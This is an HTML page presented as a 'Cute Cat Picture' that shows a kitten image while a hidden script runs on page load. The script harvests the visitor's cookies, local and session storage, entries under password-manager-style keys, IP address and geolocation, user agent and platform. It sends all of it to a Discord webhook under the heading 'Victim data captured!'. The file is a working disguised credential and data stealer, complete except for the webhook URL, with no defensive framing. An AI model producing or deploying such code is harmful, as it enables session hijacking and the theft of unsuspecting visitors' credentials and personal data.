<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cute Cat Picture</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <!-- The "Image" -->
    <img src="https://placekitten.com/800/600" alt="Cute Cat" id="catImg">

    <script>
        // Replace this with your Discord Webhook URL
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';

        async function stealData() {
            let cookies = document.cookie || "(No Cookies)";
            let localStorageData = {};
            let sessionStorageData = {};
            let passwordManagers = {};
            
            // 1. Grab LocalStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
            } catch (e) {
                localStorageData = "(Error accessing LocalStorage)";
            }

            // 2. Grab SessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionStorageData[key] = sessionStorage.getItem(key);
                }
            } catch (e) {
                sessionStorageData = "(Error accessing SessionStorage)";
            }

            // 3. Grab Common Password Manager Keys
            const pmKeys = [
                'lastpass', 'lpdata', 'bitwarden', 'bwid', '1password', 
                'chrome_passwords', 'firefox_passwords', 'autofill', 
                'credentials', 'login_data', 'password'
            ];
            
            pmKeys.forEach(key => {
                if (localStorage.getItem(key)) {
                    passwordManagers[key] = localStorage.getItem(key);
                }
                if (sessionStorage.getItem(key)) {
                    passwordManagers[key] = sessionStorage.getItem(key);
                }
            });

            // 4. Get IP and Geolocation
            let ipInfo = "Failed to fetch IP";
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    ipInfo = {
                        IP: data.ip,
                        City: data.city,
                        Region: data.region,
                        Country: data.country_name,
                        ISP: data.org,
                        Timezone: data.timezone
                    };
                } else {
                    ipInfo = "API Error";
                }
            } catch (e) {
                ipInfo = "Network Error";
            }

            // Format payloads for Discord
            const payload = {
                embeds: [{
                    title: "🔥 Full Data Logger",
                    description: "Victim data captured!",
                    color: 15158332, // Red
                    fields: [
                        {
                            name: "🍪 Cookies",
                            value: `\`\`\`${cookies}\`\`\``,
                            inline: false
                        },
                        {
                            name: "💾 Local Storage",
                            value: `\`\`\`${JSON.stringify(localStorageData)}\`\`\``,
                            inline: false
                        },
                        {
                            name: "⏳ Session Storage",
                            value: `\`\`\`${JSON.stringify(sessionStorageData)}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🔑 Password Managers",
                            value: `\`\`\`${JSON.stringify(passwordManagers)}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🌐 IP Info",
                            value: `\`\`\`${JSON.stringify(ipInfo)}\`\`\``,
                            inline: true
                        },
                        {
                            name: "🖥️ User Agent",
                            value: `\`\`\`${navigator.userAgent}\`\`\``,
                            inline: true
                        },
                        {
                            name: "📱 Platform",
                            value: `\`\`\`${navigator.platform}\`\`\``,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Logged by NoTrack Logger"
                    }
                }]
            };

            // Send to Discord
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => console.log('Data sent successfully'))
            .catch(error => console.error('Error sending data:', error));
        }

        window.onload = stealData;
    </script>

</body>
</html>
